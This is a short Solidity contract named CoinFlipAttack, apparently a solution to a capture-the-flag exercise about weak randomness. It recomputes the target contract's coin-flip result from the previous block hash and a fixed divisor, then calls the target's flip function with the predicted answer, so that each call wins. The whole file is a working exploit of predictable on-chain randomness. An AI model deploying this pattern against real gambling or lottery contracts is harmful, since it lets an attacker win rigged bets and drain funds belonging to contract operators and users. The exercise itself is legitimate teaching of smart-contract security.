// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

interface ICoinFlip {
    function consecutiveWins() external returns (uint256);
    function flip(bool _guess) external;
}

contract CoinFlipAttack {

    using SafeMath for uint256;
    address public owner;
    ICoinFlip targetContract;
    uint256 lastHash;
    uint targetValue;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetAddr) {
        targetContract = ICoinFlip(_targetAddr);
        owner = msg.sender;
    }

    function guess() public returns (bool side) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        side = coinFlip == 1 ? true : false;

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
    }
    
    function flip() public {
        require(msg.sender == owner, "my hack!");

        targetContract.flip(guess());
    }
}